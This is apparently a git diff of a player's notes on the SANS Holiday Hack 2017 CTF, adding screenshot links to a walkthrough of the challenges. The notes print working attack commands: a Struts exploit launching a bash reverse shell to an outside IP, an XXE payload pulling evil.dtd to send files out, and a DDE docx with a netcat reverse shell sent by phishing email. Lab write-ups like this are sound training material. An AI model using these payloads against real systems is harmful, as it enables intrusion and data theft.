@@ -1,6 +1,12 @@
 # CTF Main Challenges
 This is a rough write of my notes while completing the challenge, he offical report is under Final Writeup section.
 
+Attack Flow Summary of the challenges:
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/51-final.png" width="50%">
+</p>
+
+
 ## Challenge - 1 
 Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. 
 What is the title of that page?
@@ -22,6 +28,9 @@ What is Alabaster Snowball's password?
 #### To Solve:
 ```stream_unhappy_buy_loss```
 
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/21-2.png" width="50%">
+</p>
 In Source Code of https://l2s.northpolechristmastown.com, found link to :
 https://dev.northpolechristmastown.com/orders.xhtml running apache struts
 https://github.com/mazen160/struts-pwn_CVE-2017-9805
@@ -29,19 +38,34 @@ https://github.com/mazen160/struts-pwn_CVE-2017-9805
  
 ```python struts-pwn.py --url 	'https://dev.northpolechristmastown.com/orders'```
 
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/23-2.png" width="50%">
+</p>
+
 Then Used https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code 
 from Hint which points to this tool to encode https://raw.githubusercontent.com/chrisjd20/cve-2017-9805.py/master/cve-2017-9805.py
 downloaded python and used to send bash reverse shell 
 
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/24-2.png" width="50%">
+</p>
+
 ```bash -i >& /dev/tcp/54.202.232.184/80 0>&1"```
 ```python cve-2017-9805.py -u  'https://dev.northpolechristmastown.com/orders/' -c  "bash -i >& /dev/tcp/54.202.232.184/80 0>&1"```
 
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/25-2.png" width="50%">
+</p>
 Success! got reverse shell on AWS instance
 
 
 In Reverse shell went to `````/var/www/`````
 found GreatBookPage2.pdf
 https://l2s.northpolechristmastown.com/GreatBookPage2.pdf
+
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/26-2.png" width="50%">
+</p>
 
 Pillaged to find dev files with password 
 
@@ -61,6 +85,10 @@ final String password = "stream_unhappy_buy_loss";
 Tried the creds and logged into SSH:
 ```ssh alabaster_snowball@35.227.95.239```
 
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/27-2.png" width="50%">
+</p>
+
 confirmed password with successful login!
 
 ## Challenge 3 -SMB
@@ -76,21 +104,38 @@ For hints, please see Holly Evergreen in the Cryokinetic Magic Level.
 
 #### To Solve:
 
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/28-3.png" width="50%">
+</p>
+
 From ec2 instance and tunneling through Letters to Santa :
 
 ```ssh -C -D 1080 alabaster_snowball@35.227.95.239```
 
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/29-3.png" width="50%">
+</p>
+
 Did some recon:
 ```nmap 10.142.0.0/24 -sn```
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/30-3.png" width="50%">
+</p>
+
 didnt reveal the SMB server
 
 ```nmap 10.142.0.0/24  -PS445 (HINT from Holly Evergreen)```
+
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/31-3.png" width="50%">
+</p>
 
 revealed a new IP of 10.142.0.7 with 445 open 
 
 hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
 
 ```proxychains smbclient -L 10.142.0.7 -U alabaster_snowball```
+
 
 
 ```Enter WORKGROUP\alabaster_snowball's password: 
@@ -107,6 +152,10 @@ Reconnecting with SMB1 for workgroup listing.
 FileShare name is FileStor
 
 ```proxychains smbclient \\\\10.142.0.7\\FileStor -U alabaster_snowball```
+
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/32-4.png" width="50%">
+</p>
 
 From there was able to get GreatBookPage3.pdf
 
@@ -132,15 +181,27 @@ proxychains firefox
 
 Recon on the website:
 
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/37-4.png" width="50%">
+</p>
 mail.northpolechristmastown.com (10.142.0.5)
 ```
 http://10.142.0.5/robots.txt
 http://10.142.0.5/cookie.txt
 http://10.142.0.5/orders.xhtml
 ```
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/38-4.png" width="50%">
+</p>
+
 alabaster.snowball@northpolechristmastown.com
 
 Found site to encrpt to AES256 and used https://aesencryption.net/
+
+
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/39-4.png" width="50%">
+</p>
 
 Create AES256 string using
 ``
@@ -153,6 +214,9 @@ final cookie should look like this
 ```
 {"name":"alabaster.snowball@northpolechristmastown.com","plaintext":"","ciphertext":"y0MBQ642b8EM5psdSpS03Q=="}
 ```
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/40-4.png" width="50%">
+</p>
 
 Found email with Greatbook page from holly Everygreen
 ```
@@ -173,6 +237,10 @@ Infractions for rock throwing were Bini and Boq
 #### To Solve:
 
 Go to website https://nppd.northpolechristmastown.com/infractions?query=name%3A*
+
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/41-5.png" width="50%">
+</p>
 
 Craft request to returns all of the names (status:*)
 
@@ -210,7 +278,13 @@ Use the Elfdata.xml give to inject XXE to get file and Create Evil.dtd:
 Add into Elfdata.xml the XEE payload 
 <!DOCTYPE demo [<!ELEMENT demo ANY >ENTITY % extentity SYSTEM "http://54.202.232.184:80/evil.dtd">%extentity;%inception;%sendit;]>
 ```
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/44-6.png" width="50%">
+</p>
 
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/43-6.png" width="50%">
+</p>
 Upload the edited Elfdata.xml to site
 
 On EC2 start simple python server:
@@ -245,6 +319,10 @@ setup browser to proxy traffic through 127.0.0.1 1080 socks proxy
 
 Visit site EWS site at http://10.142.0.5/account.html
 
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/48-7.png" width="50%">
+</p>
+
 Use cookie login bypass method from Challenge 4
 
 Login  as jessica.claus@northpolechristmastown.com and write email to alabaster.snowball@northpolechristmastown.com
@@ -252,6 +330,10 @@ create a new docx with the following formula:
 ```
 {DDEAUTO c:\\windows\\system32\\cmd.exe "/k nc 10.142.0.11 10443 -e cmd.exe"}
 ```
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/49-7.png" width="50%">
+</p>
+
 Attach docx to email 
 start listener on server you just sshed tunnelled into 
 ```
@@ -261,6 +343,10 @@ send email
 Get CMD reverse shell!
 
 Now you can go to directory C:\ to find GreatBookPage7.pdf
+
+<p align="left"> 
+<img src= "https://github.com/johnnymedina/Sans-HolidayHack-2017/blob/master/Images/50-7.png" width="50%">
+</p>
 
 Start netcat listners on EMI server that servers up file
 ```
@@ -283,4 +369,6 @@ saved and re-executed shasum to get correct value
 ```
 c1df4dbc96a58b48a9f235a1ca89352f865af8b8
 ```
+
+
 
